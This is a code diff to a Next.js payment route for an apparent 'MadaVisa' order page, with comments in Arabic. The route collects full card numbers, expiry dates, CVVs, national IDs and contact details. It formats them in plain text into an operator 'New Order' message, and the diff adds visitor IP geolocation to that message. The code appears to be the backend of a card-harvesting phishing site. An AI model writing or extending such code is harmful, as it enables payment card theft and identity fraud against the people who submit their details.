@@ -4,6 +4,18 @@ export async function POST(req: NextRequest) {
   const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+
+  // جيب الـ IP والدولة
+  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
+  let country = "غير معروف";
+  const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
+  if (!isLocal) {
+    try {
+      const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
+      const geoData = await geo.json();
+      if (geoData.country) country = geoData.country;
+    } catch {}
+  }
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
   // حفظ في الداتابيز
@@ -26,6 +38,7 @@ export async function POST(req: NextRequest) {
       : [`🧾 Payment Type: Full Amount`]),
     ``,
     `🏦 MadaVisa - New Order`,
+    `🌍 Country: ${country}`,
     `🙍 Order For: ${customer ?? "-"}`,
     `📲 WhatsApp: ${whatsapp ?? "-"}`,
     `🪪 Card Number: ${cardNumber}`,
